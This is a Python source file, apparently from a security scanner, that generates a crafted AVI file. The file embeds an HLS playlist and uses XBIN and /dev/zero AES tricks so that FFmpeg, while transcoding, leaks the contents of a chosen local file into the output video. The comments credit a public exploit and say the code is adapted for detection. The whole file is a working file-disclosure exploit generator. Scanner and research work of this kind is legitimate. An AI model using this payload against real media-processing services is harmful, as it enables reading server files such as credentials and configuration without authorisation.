import random
import string
import struct


class AviM3uXbin(object):
    # Implementation taken from https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py
    # and edited for our needs
    # TODO feature: Maybe make smaller, we actually don't need the AES and /dev/zero trick for detection only...
    AVI_HEADER = "RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                 "\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00" \
                 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00" \
                 "\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00" \
                 "\x00\x00\x00\x00}\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00" \
                 "strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00" \
                 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi"

    ECHO_TEMPLATE = """### echoing {needed!r}
    #EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv}
    #EXTINF:1,
    #EXT-X-BYTERANGE: 16
    /dev/zero
    #EXT-X-KEY: METHOD=NONE
    """

    # AES.new('\x00'*16).decrypt('\x00'*16)
    GAMMA = b'\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'

    FULL_PLAYLIST = """#EXTM3U
    #EXT-X-MEDIA-SEQUENCE:0
    {content}
    #### random string to prevent caching: {rand}
    #EXT-X-ENDLIST"""

    EXTERNAL_REFERENCE_PLAYLIST = """
    ####  External reference: reading {size} bytes from {filename} (offset {offset})
    #EXTINF:1,
    #EXT-X-BYTERANGE: {size}@{offset}
    {filename}
    """

    XBIN_HEADER = 'XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'

    def __init__(self):
        self.test_xbin_sync(self.gen_xbin_sync())
        self.sync = self.echo_seq(self.gen_xbin_sync())

    def echo_block(self, block):
        assert len(block) == 16
        iv = ''.join(map('{:02x}'.format, [ord(x) ^ ord(y) for (x, y) in zip(block, AviM3uXbin.GAMMA)]))
        return AviM3uXbin.ECHO_TEMPLATE.format(needed=block, iv=iv)

    def gen_xbin_sync(self):
        seq = []
        for i in range(60):
            if i % 2:
                seq.append(0)
            else:
                seq.append(128 + 64 - i - 1)
        for i in range(4, 0, -1):
            seq.append(128 + i - 1)
        seq.append(0)
        seq.append(0)
        for i in range(12, 0, -1):
            seq.append(128 + i - 1)
        seq.append(0)
        seq.append(0)
        return ''.join([chr(x) for x in seq])

    def test_xbin_sync(self, seq_str):
        seq = [ord(x) for x in seq_str]
        for start_ind in range(64):
            path = [start_ind]
            cur_ind = start_ind
            while cur_ind < len(seq):
                if seq[cur_ind] == 0:
                    cur_ind += 3
                else:
                    assert seq[cur_ind] & (64 + 128) == 128
                    cur_ind += (seq[cur_ind] & 63) + 3
                path.append(cur_ind)
            assert cur_ind == len(seq), "problem for path {}".format(path)

    def echo_seq(self, s):
        assert len(s) % 16 == 0
        res = []
        for i in range(0, len(s), 16):
            res.append(self.echo_block(s[i:i + 16]))
        return ''.join(res)

    def make_playlist_avi(self, playlist, fake_packets=1000, fake_packet_len=3):
        content = 'GAB2\x00\x02\x00' + '\x00' * 10 + playlist.encode('ascii')
        packet = '00tx' + struct.pack('<I', len(content)) + content
        dcpkt = '00dc' + struct.pack('<I', fake_packet_len) + '\x00' * fake_packet_len
        return AviM3uXbin.AVI_HEADER + packet + dcpkt * fake_packets

    def gen_xbin_packet_header(self, size):
        return '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'+chr(128 + size - 1)+'\n'

    def gen_xbin_packet_playlist(self, filename, offset, packet_size):
        result = []
        while packet_size > 0:
            packet_size -= 16
            assert packet_size > 0
            part_size = min(packet_size, 64)
            packet_size -= part_size
            result.append(self.echo_block(self.gen_xbin_packet_header(part_size)))
            result.append(
                AviM3uXbin.EXTERNAL_REFERENCE_PLAYLIST.format(
                    size=part_size,
                    offset=offset,
                    filename=filename))
            offset += part_size
        return ''.join(result), offset

    def gen_xbin_playlist(self, filename_to_read):
        pls = [self.echo_block(AviM3uXbin.XBIN_HEADER)]
        next_delta = 5
        for max_offs, filename in (
                (5000, filename_to_read), (500, "file:///dev/zero")):
            offset = 0
            while offset < max_offs:
                for _ in range(10):
                    pls_part, new_offset = self.gen_xbin_packet_playlist(
                        filename, offset, 0xf0 - next_delta)
                    pls.append(pls_part)
                    next_delta = 0
                offset = new_offset
            pls.append(self.sync)
        return AviM3uXbin.FULL_PLAYLIST.format(content=''.join(pls), rand=''.join(
            random.choice(string.ascii_lowercase) for _ in range(30)))

    def get_avi_file(self, _, url):
        content = self.gen_xbin_playlist(url)
        avi = self.make_playlist_avi(content)
        return avi
